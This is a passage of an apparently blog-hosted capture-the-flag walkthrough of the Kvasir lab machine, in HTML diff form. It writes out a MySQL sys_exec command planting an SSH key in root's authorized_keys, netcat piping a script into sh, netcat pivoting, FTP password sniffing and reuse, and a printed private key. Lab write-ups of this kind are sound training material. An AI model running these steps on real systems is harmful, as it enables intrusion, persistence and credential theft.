-mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;select sys_exec(&amp;quot;echo \&amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W8Vu9F68nqmIYyk3hBlydwbOkevh/HfsNm50pd7ZZPK/mpAdZxYYxfBcvUQcWmgtw49ihTAJGh5KZJM/pL4xCw/meavFXy01SX7TZNAmrxcn6FDcXQJ6DC+TUMWXigxcCwntKxSHChyTiDB\&amp;quot; &amp;gt; /root/.ssh/authorized_keys&amp;quot;)&#39; 2&amp;gt;&amp;gt; log
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;With this file ready, I opened a netcat port to pipe it to, and read it on &lt;code&gt;web&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# on the attacking machine, I opened netcat with my mysql commands
-root@kali:~# nc -lvp 4444 &amp;lt; load_udf.sh
-listening on [any] 4444 ...
-
-# then on the original netcat shell I have, read it
-timeout 3 nc 192.168.56.101 4444 | sh
-name    ret dl  type
-sys_exec    2   raptor_udf.so   function
-sys_exec(&amp;quot;echo \&amp;quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPzHgBKct5VjcxsoGfzL/g2XfOk6k6vhHxS4V1C4x0483V29E5OhEDSW/3pfJVwv9m/BW1aXJe5sLO3G3kn0VhgEen+YHShXu09cv3ROu98krlwYcmzyMyfZdwU0D2DbIJjFKWaqEafIcLx01vmFozcxk3C1bhPdo6mBuu2XGWJx6OpqXYnnRGebXdBqKT9b5JmEVn/W
-0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The public ssh key is sourced from a new key pair I generated for Kvasir. So, with that run we get a exit code of &lt;code&gt;0&lt;/code&gt;, indicating that it was successful. I specify the &lt;code&gt;timeout&lt;/code&gt; command so that the nc session opened from within another nc session will exit and we don’t lose the shell. Pressing ^C will kill the whole session and not just the netcat I just run :)&lt;/p&gt;
-
-&lt;h2 id=&#34;ssh-to-db-host&#34;&gt;ssh to db host&lt;/h2&gt;
-
-&lt;p&gt;With all that done, I have my public key for the &lt;code&gt;root&lt;/code&gt; user added, and I should be able to ssh to it. There is one interesting hurdle though, how do I &lt;em&gt;get&lt;/em&gt; to 192.168.2.200&amp;rsquo;s port 22? :)&lt;/p&gt;
-
-&lt;p&gt;For that, I decided to look at &lt;code&gt;netcat&lt;/code&gt; port forwarding! But first, lets read some man pages:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#from nc(1)
-OPTIONS
-       -c string    specify shell commands to exec after connect (use with caution).
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;em&gt;&amp;ldquo;use with caution&amp;rdquo;&lt;/em&gt;. I like it already. Ok so I can open a netcat listener, which will open another one on connect listening on a new port. We can then connect to this listener, opening another connection to the ssh server we want to connect to, effectively forwarding the port. Clear as mud!&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_clear_as_mud.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;Lets see this in action. First I setup the initial listener on the attacking machine:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# listen on tcp/4444, re-listening on tcp/222 on a new connection
-root@kali:~# nc -lvp 4444 -c &amp;quot;nc -lvp 222&amp;quot;
-listening on [any] 4444 ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;With the listener setup, lets issue a new &lt;code&gt;nc&lt;/code&gt; command in the initial shell that I got on &lt;code&gt;web&lt;/code&gt;, connecting the dots:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;nc 192.168.56.101 4444 -c &amp;quot;nc 192.168.2.200 22&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;When this runs, the initial listener will see the new connection, and I should have the &lt;code&gt;tcp/22&lt;/code&gt; of &lt;strong&gt;192.168.2.200&lt;/strong&gt; now forwarded locally:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nc -lvp 4444 -c &amp;quot;nc -lvp 222&amp;quot;
-listening on [any] 4444 ...
-
-# connection comes in from 192.168.1.100
-192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
-connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53870
-listening on [any] 222 ...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lets take a look at a updated network diagram, detailing where I am in the network now. The new port forward is denoted in red:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_2.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;Lets try and SSH in with the key pair that I generated and loaded using the MySQL UDF:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ssh -D 8000 root@127.0.0.1 -p222 -i kvasir_key
-Linux db 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-Last login: Sun Nov  9 07:13:17 2014 from 192.168.2.100
-root@db:~#
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I added the &lt;code&gt;-D&lt;/code&gt; option so that I may have a socks proxy to work with should any further tunneling be required. This means now that with the SSH session built, I have a &lt;em&gt;almost&lt;/em&gt; &lt;em&gt;direct&lt;/em&gt; connection to the &lt;code&gt;db&lt;/code&gt; (192.168.2.200) host, as denoted in green below:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_3.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;8-)&lt;/p&gt;
-
-&lt;h2 id=&#34;not-exactly-nsa-level-spying-but-heh&#34;&gt;not exactly nsa level spying but heh&lt;/h2&gt;
-
-&lt;p&gt;Initial enumeration revealed that this host (&lt;code&gt;db&lt;/code&gt;) had 2 network interfaces. One with IP &lt;strong&gt;192.168.2.200&lt;/strong&gt; (the one I came in from), and another with IP &lt;strong&gt;192.168.3.200&lt;/strong&gt;. There were also 2 entries in &lt;code&gt;/etc/hosts&lt;/code&gt; about 2 hosts in the 3.x network:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# cat /etc/hosts
-# 192.168.3.40  celes
-# 192.168.3.50  terra
-
-[... snip ...]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The host was also running a mysql server (the one we pwnd), and a pure-ftpd server:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# ps -ef
-UID        PID  PPID  C STIME TTY          TIME CMD
-root         1     0  0 Nov08 ?        00:00:00 init [3]
-root      1242     1  0 Nov08 ?        00:00:00 dhclient -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0
-root      1408     1  0 Nov08 ?        00:00:00 /usr/sbin/sshd
-root      1434     1  0 Nov08 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
-root      1761  1434  0 Nov08 ?        00:00:37 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --pid-file=/var/run/mysqld/mysqld
-root      1762  1434  0 Nov08 ?        00:00:00 logger -t mysqld -p daemon.error
-root      1861     1  0 Nov08 ?        00:00:00 pure-ftpd (SERVER)
-[... snip ...]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A interesting file was in &lt;code&gt;/root/.words.txt&lt;/code&gt;, which contained some random words, some of which i recognized as nicks in #vulnhub on freenode.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# head /root/.words.txt
-borne
-precombatting
-noncandescent
-cushat
-lushness
-precensure
-romishness
-nonderivable
-overqualification
-superkojiman
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And finally, a troll flag :D&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# cat /root/flag
-This is not the flag you&#39;re looking for... :p
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This was the first time I was really stuck on Kvasir. After quite a bit of poking around, I noticed a user &lt;code&gt;celes&lt;/code&gt; in &lt;code&gt;/etc/pure-ftpd/pureftpd.passwd&lt;/code&gt;, with a password that I was not able to crack. The host itself did not have this user configured either. I was starting to think that this server has nothing really to offer in the form of post exploitation and started planning exploration of neighboring hosts and their network services.&lt;/p&gt;
-
-&lt;p&gt;At one stage, I was checking to see what network activity was present on the interfaces, of which &lt;code&gt;eth0&lt;/code&gt; had my SSH session, and &lt;code&gt;eth1&lt;/code&gt; was quiet. At least, until I was about to close the tcpdump I had this sudden burst of packets:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# tcpdump -i eth1
-tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
-listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
-13:19:01.355970 IP 192.168.3.40.36425 &amp;gt; 192.168.3.200.ftp: Flags [S], seq 2471029534, win 14600, options [mss 1460,sackOK,TS val 13092832 ecr 0,nop,wscale 5], length 0
-13:19:01.355988 IP 192.168.3.200.ftp &amp;gt; 192.168.3.40.36425: Flags [S.], seq 2507516314, ack 2471029535, win 14480, options [mss 1460,sackOK,TS val ack 535, win 490, options [nop,nop,TS val 13092837 ecr 13092836], length 0
-
-[... snip ...]
-
-13:19:01.378604 IP 192.168.3.200.ftp &amp;gt; 192.168.3.40.36425: Flags [P.], seq 535:548, ack 53, win 453, options [nop,nop,TS val 13092837 ecr 13092837], length 13
-13:19:01.378631 IP 192.168.3.40.36425 &amp;gt; 192.168.3.200.ftp: Flags [R], seq 2471029587, win 0, length 0
-^C
-29 packets captured
-29 packets received by filter
-0 packets dropped by kernel
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I changed the command to add the &lt;code&gt;-X&lt;/code&gt; flag as this looked like FTP traffic flowing over the interface (you haven&amp;rsquo;t forgotten the ftp server yet have you?).&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;13:25:01.387981 IP 192.168.3.200.ftp &amp;gt; 192.168.3.40.36437: Flags [P.], seq 321:359, ack 13, win 453, options [nop,nop,TS val 13182840 ecr 13182839], length 38
-    0x0000:  4510 005a 7e22 4000 4006 342b c0a8 03c8  E..Z~&amp;quot;@.@.4+....
-    0x0010:  c0a8 0328 0015 8e55 1bf0 5a96 015a 5499  ...(...U..Z..ZT.
-    0x0020:  8018 01c5 42a1 0000 0101 080a 00c9 2778  ....B.........&#39;x
-    0x0030:  00c9 2777 3333 3120 5573 6572 2063 656c  ..&#39;w331.User.cel
-    0x0040:  6573 204f 4b2e 2050 6173 7377 6f72 6420  es.OK..Password.
-    0x0050:  7265 7175 6972 6564 0d0a                 required..
-
-13:25:01.388050 IP 192.168.3.40.36437 &amp;gt; 192.168.3.200.ftp: Flags [P.], seq 13:32, ack 359, win 490, options [nop,nop,TS val 13182840 ecr 13182840], length 19
-    0x0000:  4500 0047 73fe 4000 4006 3e72 c0a8 0328  E..Gs.@.@.&amp;gt;r...(
-    0x0010:  c0a8 03c8 8e55 0015 015a 5499 1bf0 5abc  .....U...ZT...Z.
-    0x0020:  8018 01ea a5ae 0000 0101 080a 00c9 2778  ..............&#39;x
-    0x0030:  00c9 2778 5041 5353 2069 6d32 3242 4634  ..&#39;xPASS.im22BF4
-    0x0040:  4858 6e30 310d 0a                        HXn01..
-
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A cleartext username and password? Well aint that just handy! :D Just to confirm I wrote a pcap to disk with the &lt;code&gt;-W&lt;/code&gt; flag, transferred it to my attacking machine and opened it in Wireshark so that I can inspect the whole FTP conversation.&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_ftp_session.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;It seems like &lt;code&gt;celes&lt;/code&gt; is simply logging in, getting a directory listing, and logging out.&lt;/p&gt;
-
-&lt;p&gt;Taking a long shot, I wondered if the age old problem of password reuse is applicable here, so I tried to ssh in to &lt;strong&gt;192.168.3.40&lt;/strong&gt; (the ip the FTP conversation was coming from) using &lt;code&gt;celes:im22BF4HXn01&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@db:~# ssh celes@192.168.3.40
-celes@192.168.3.40&#39;s password: # entered im22BF4HXn01
-Linux dev1 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64
-
-The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
-permitted by applicable law.
-You have mail.
-Last login: Thu Sep  4 09:20:00 2014
-celes@dev1:~$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;finding-terras-secret&#34;&gt;finding terras secret&lt;/h2&gt;
-
-&lt;p&gt;Ok lets take a moment and make sure I know where I am in the network. The newly accessed server is denoted in red:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_4.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;I don’t have connectivity directly to &lt;strong&gt;192.168.3.40&lt;/strong&gt; at the moment, but if I really need that I can arrange it. For now, lets see what we have on &lt;code&gt;dev1&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;First, I find the sneaky ftp session script &lt;code&gt;getLogs.py&lt;/code&gt;, that does exactly that which I saw in the packet captures. Next, I find a message in &lt;code&gt;celes&lt;/code&gt; mailbox:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;celes@dev1:~$ cat /var/spool/mail/celes
-Return-path: &amp;lt;celes@localhost&amp;gt;
-Received: from celes by localhost with local (Exim 4.80)
-    (envelope-from &amp;lt;celes@localhost&amp;gt;)
-    id 1XHczw-0000V2-8y
-    for celes@127.0.0.1; Wed, 13 Aug 2014 19:10:08 +0100
-Date: Wed, 13 Aug 2014 19:10:08 +0100
-To: celes@127.0.0.1
-Subject: Reminder
-User-Agent: Heirloom mailx 12.5 6/20/10
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Message-Id: &amp;lt;E1XHczw-0000V2-8y@localhost&amp;gt;
-From: celes@localhost
-
-Terra sent me kvasir.png and challenged me to solve the stupid little puzzle she has running on her machine... *sigh*
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The message reveals that Terra has a puzzle on her machine (&lt;strong&gt;192.168.3.50&lt;/strong&gt; from &lt;code&gt;/etc/hosts&lt;/code&gt; on the &lt;code&gt;db&lt;/code&gt; server?). She also mentions &lt;code&gt;kvasir.png&lt;/code&gt;, which happens to be in &lt;code&gt;celese&lt;/code&gt; home directory:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;celes@dev1:~$ ls -lah kvasir.png
--rw-r--r-- 1 celes celes 103K Sep  3 22:16 kvasir.png
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lastly, the &lt;code&gt;.bash_history&lt;/code&gt; for &lt;code&gt;celese&lt;/code&gt; has a entry &lt;code&gt;stepic --help&lt;/code&gt;. &lt;code&gt;stepic&lt;/code&gt; is a steganography tool. So, it seemed pretty clear what needs to be done here. My guess was that kvasir.png has a piece of the puzzle that is on Terra&amp;rsquo;s machine. So, I converted the &lt;code&gt;kvasir.png&lt;/code&gt; image to hex, and copy pasted the output on my attacking machine into a text file and converted it back to a image using &lt;code&gt;xxd -r -p kvasir.png.xxd &amp;gt; kvasir.png&lt;/code&gt;.&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_kvasir.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;h3 id=&#34;getting-stepic-to-play-nice&#34;&gt;getting stepic to play nice&lt;/h3&gt;
-
-&lt;p&gt;With the image ready, I searched for &lt;code&gt;stepic&lt;/code&gt; using &lt;code&gt;pip&lt;/code&gt; in my virtual env and installed it:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# pip install stepic
-Downloading/unpacking stepic
-  Downloading stepic-0.4%7ebzr.tar.gz
-  Running setup.py egg_info for package stepic
-
-Installing collected packages: stepic
-  Running setup.py install for stepic
-    changing mode of build/scripts-2.7/stepic from 644 to 755
-
-    changing mode of /root/kvasir/bin/stepic to 755
-Successfully installed stepic
-Cleaning up...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;However, &lt;code&gt;stepic&lt;/code&gt; was not just a case of plug and play for me. &lt;strong&gt;NOPE&lt;/strong&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# stepic
-Traceback (most recent call last):
-  File &amp;quot;/root/kvasir/bin/stepic&amp;quot;, line 24, in &amp;lt;module&amp;gt;
-    import Image
-ImportError: No module named Image
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Long story short, a small hack and installation of another dependency finally got it working for me:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# pip install pillow
-Downloading/unpacking pillow
-  Downloading Pillow-2.6.1.tar.gz (7.3Mb): 7.3Mb downloaded
-  Running setup.py egg_info for package pillow
-    Single threaded build, not installing mp_compile: 1 processes
-
-[... snip ...]
-
-    *** OPENJPEG (JPEG2000) support not available
-    --- ZLIB (PNG/ZIP) support available
-
-[... snip ...]
-
-Successfully installed pillow
-Cleaning up...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The final hack was to change the installed &lt;code&gt;stepic&lt;/code&gt; bin at &lt;code&gt;/root/kvasir/bin/stepic&lt;/code&gt; line 24 from &lt;code&gt;import Image&lt;/code&gt; to &lt;code&gt;from PIL import Image&lt;/code&gt;. Finally, &lt;code&gt;stepic&lt;/code&gt; was working fine.&lt;/p&gt;
-
-&lt;h3 id=&#34;finding-the-secret&#34;&gt;finding the secret&lt;/h3&gt;
-
-&lt;p&gt;With &lt;code&gt;stepic&lt;/code&gt; up and running, I was finally able to run it against the image &lt;code&gt;kvasir.png&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# stepic --decode --image-in=kvasir.png --out=out
-
-# check the file type we got out
-root@kali:~# file out
-out: ASCII text, with very long lines, with no line terminators
-
-# check the output we got
-root@kali:~# cat out
-89504e470d0a1a0a0000000d494844520000012200000122010300000067704df500000006504c5
-445ffffff00000055c2d37e00000104494441540899ed98c90dc32010459152804b72eb2ec90544
-22304bc089655f180ec9fb0730f07cfa9a0552420821f43fcaa6674aeb5e96dbe23b1b5434a58be
-559bf1e59befa03a848aa5ab22de690f2d530a8895473086a365500e7a1265132b5b3bbfc05358e
-7a57640b919bba0d358eeab55c9c418da7cc0df1a576a2792fa561ad035434a5920b808588d974e
-215d4584acff4065626ffe9db47a8e194eec805a00d7621830aa6acffd40c95d5a6fa27d404cae5
-55e13475410550e6cca113ed72145424a56ee8ab4f8989ecb5196a02d5bdfa2477e83333410553d
-97ba093cc04154c89a439ba880ea881944c2d3aea0a6a0e75acc8528c4550e1144208a15fd70b88
-df9bb4ae0a3dc20000000049454e44ae426082
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;At this stage I was pretty convinced my hacks to get &lt;code&gt;stepic&lt;/code&gt; to work failed. I am also not really sure what to expect as output so that made it even harder to know if I had something to work with there.&lt;/p&gt;
-
-&lt;p&gt;Close study of the output string though got me started in trying to determine what this was that I had. My method involved me invoking a python shell and trying a bunch of &lt;code&gt;decode()&lt;/code&gt; methods on it. I just took the first few characters of the output to play with as some decodings need specific string lengths etc:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# python
-Python 2.7.3 (default, Mar 14 2014, 11:57:14)
-[GCC 4.7.2] on linux2
-Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information.
-&amp;gt;&amp;gt;&amp;gt; &amp;quot;89504e470d0a1a0a000000&amp;quot;.decode(&amp;quot;hex&amp;quot;)
-&#39;\x89PNG\r\n\x1a\n\x00\x00\x00&#39;
-&amp;gt;&amp;gt;&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Decoding it as &lt;code&gt;hex&lt;/code&gt; revealed the part I needed to see&amp;hellip; &lt;code&gt;PNG&lt;/code&gt;! So this string was a hex encoded PNG image (unless thats a troll too&amp;hellip;). I took &lt;code&gt;out&lt;/code&gt; and reversed it using &lt;code&gt;xxd -r -p&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# xxd -p -r out &amp;gt; kvasir2.png
-root@kali:~# file kvasir2.png
-kvasir2.png: PNG image data, 290 x 290, 1-bit colormap, non-interlaced
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lets see what the image looks like:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_kvasir_qr.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;A QR code! I fetched my phone and scanned it, revealing the string &lt;code&gt;Nk9yY31hva8q&lt;/code&gt;. Great!&amp;hellip; I think. Wait, what does this even mean? I got stumped again into wondering what this arb string is for that I have. It was not the root password for &lt;code&gt;dev1&lt;/code&gt; either.&lt;/p&gt;
-
-&lt;h2 id=&#34;playing-terra-s-game&#34;&gt;playing Terra&amp;rsquo;s game&lt;/h2&gt;
-
-&lt;p&gt;Without being able to place the string found in the QR code, I stepped one step back and decided to check out Terra&amp;rsquo;s game as per the email. From the &lt;code&gt;/etc/hosts&lt;/code&gt; on &lt;code&gt;db&lt;/code&gt;, I saw a comment for &lt;code&gt;terra&lt;/code&gt; as &lt;strong&gt;192.168.3.50&lt;/strong&gt;. Using the SSH socks proxy on &lt;code&gt;tcp/8000&lt;/code&gt; I setup when I setup the SSH session to &lt;strong&gt;192.168.2.200&lt;/strong&gt;, I nmapped &lt;strong&gt;192.168.3.50&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# /etc/proxychains.conf has line
-# socks5    127.0.0.1 8000
-
-# scans will appear to be coming from 192.168.3.200 for
-# 192.168.3.50
-root@kali:~# proxychains nmap -sT 192.168.3.50
-ProxyChains-3.1 (http://proxychains.sf.net)
-
-Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 16:31 SAST
-Nmap scan report for 192.168.3.50
-Host is up (0.0012s latency).
-Not shown: 998 closed ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-4444/tcp open  krb524
-
-Nmap done: 1 IP address (1 host up) scanned in 1.47 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Well &lt;code&gt;tcp/4444&lt;/code&gt; looks interesting! Lets have a look!&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains nc 192.168.3.50 4444
-ProxyChains-3.1 (http://proxychains.sf.net)
-Hello Celes &amp;amp; Welcome to the Jumble!
-
-Solve:indrssoses
-Solve:roneb bob
-Solve:abaerrbs
-
-[... snip ...]
-
-Solve:iepasncm
-
-Score: 0
-Time: 22.71 secs
-Just a bit embarrasing really...
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Don&amp;rsquo;t think I did too well there! :D Not to fear. I recognized some of the strings after the &lt;em&gt;Solve:&lt;/em&gt; as ones that are scrambled from the previously found &lt;code&gt;.words.txt&lt;/code&gt; file. So, my guess here was that I had to write a small script that will connect to the socket and answer with the unscrambled versions from &lt;code&gt;.words.txt&lt;/code&gt;. With the &lt;code&gt;.words.txt&lt;/code&gt; file locally available, I slapped together something to try and do this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python
-
-# Kvasir Terra Puzzle Solver
-
-import sys
-import socket
-import base64
-
-# read the words.txt we got into a list
-with open(&#39;words.txt&#39;) as f:
-    words = f.read().splitlines()
-
-# connection to the game
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect((&#39;192.168.3.50&#39;, 4444))
-
-# start processing the lines
-while True:
-
-    # receive a frame large enough
-    frame = sock.recv(150)
-
-    # check that its a question frame
-    if &#39;Solve&#39; not in frame:
-        print &amp;quot;[!] &#39;Solve&#39; not in frame. Game over?&amp;quot;
-        break
-
-    # split the frame with :
-    frame = frame.split(&#39;:&#39;)
-    if len(frame) &amp;lt; 2:
-        print &amp;quot;[!] Was unable to split by :. Game over?&amp;quot;
-        break
-
-    question = frame[1].strip()
-
-    # @barrebas suggested a length check too to increase probability :)
-    result = [s for s in words if not s.strip(question) and len(question) == len(s)]
-    #result = [s for s in words if not s.strip(question)]
-
-    if len(result) &amp;lt; 1:
-        print &amp;quot;[!] Was unable to match anything to %s&amp;quot; % question
-        continue
-
-    answer = result[0].strip()
-
-    print &amp;quot;[+] Matched %s to %s&amp;quot; % (question, answer)
-    sock.send(answer)
-
-# did we win? \:D/
-if &#39;You\&#39;re a winner&#39; in frame:
-    print &amp;quot;[+] We won!&amp;quot;
-
-    # read the rest of the socket output
-    frame += sock.recv(2500)
-
-    # base64 decode the last string
-    print &amp;quot;[+] Extracing and decoding the base64 section&amp;quot;
-    print base64.b64decode(frame.split(&#39;\n&#39;)[-1])
-    sys.exit(0)
-
-sock.close
-
-# work with what we have left
-print &amp;quot;[+] Last frame was:\n %s&amp;quot; % frame
-print &amp;quot;[+] Done&amp;quot;
-sys.exit(0)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Once you are able to get a score of 120 it seems, you are considered a winner. Once you have won, a fairly large string is output again. This string appeared to be a base64 encoded string, and as a result, I added the &lt;code&gt;base64.b64decode(frame.split(&#39;\n&#39;)[-1])&lt;/code&gt; section to the script so that if you win it will print the cleartext version.&lt;/p&gt;
-
-&lt;p&gt;The script is not perfect. Sometimes you don’t get 120 as a score and have to run it again. But, within a reasonable amount of attempts you are able to beat the game. A sample run would be:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ./play.py
-ProxyChains-3.1 (http://proxychains.sf.net)
-[+] Matched atravdeii to radiative
-[+] Matched oilyaerbdmpn to imponderably
-
-[... snip ...]
-[+] Matched idmlhkeir to kriemhild
-[!] &#39;Solve&#39; not in frame. Game over?
-[+] We won!
-[+] Extracing and decoding the base64 section
------BEGIN RSA PRIVATE KEY-----
-Proc-Type: 4,ENCRYPTED
-DEK-Info: AES-128-CBC,76841822AB9E772FD1D653F6179F0E4D
-
-OrEM2ocnhHKg5nuH7ps1CoOJCihasmFJKLOVNNYFOhGKUojPYEta5yOhIskf0h0r
-So+xVDK67G3DlgymUV3DxGfizLfZvhxQRC8Qy0mf4N+miYkvf2NaFtatpNcjK5pM
-Uy6QSFMOC8aKpe0FL6UGDRJQ5GSG4DlJrLUJBMvnSLtYZHlaWAICKbXfpXV4STwv
-J0D8h9RtlRJhLCK5eKgupYCQIiGQWg3PvZpXk9kkjXhmOQwUYoCRl3l4j5zlnFcT
-P6U9UPhRq/Ck4Qrk2dGxFfppQd9xW+b4PWjiSCikLF3Q0hfNNvEbu4ounAgYwPFH
-jOXHJqxVog/pZz9Y8XfSP3hz9AYHWfI2iC9Cnk7boRcOv+mcgEeWWkYrVscOivYj
-9N2xiNp4GH+NIG8mm/Ldl7jQMl/Vrr5cx3fXjOezmgsSkAY4CcspwKsSXK8GL/bO
-hT6pKWfL6UI8wUgpI7KhgK+AOKuS/XPYTSdz+0RJxNFSLOFNcjRtL+NW0UjPq5Jh
-Dia+pw5qB+lllxgaN0WBQskIFQpppPowwjG8Jg8jJBjSYj3r4LIrZwJSpcvoBiUA
-oCqnQUMtXlMh9/CvBBGs1+JVcjkInBde945V+ejhP6GPYju4TQV7B70d7aEW0OEm
-0d7nrOW/LCYpsV/N5rqVsGlTvwjJNowyMqEZ9E09guM5eL4CEPPmp9ZDey2fBAGw
-q7nSr8q6Hsf4d+YPR+90EfMJReqI3s1FQoTvx+PaFPiKw7dfHFCgLscXcXcognLz
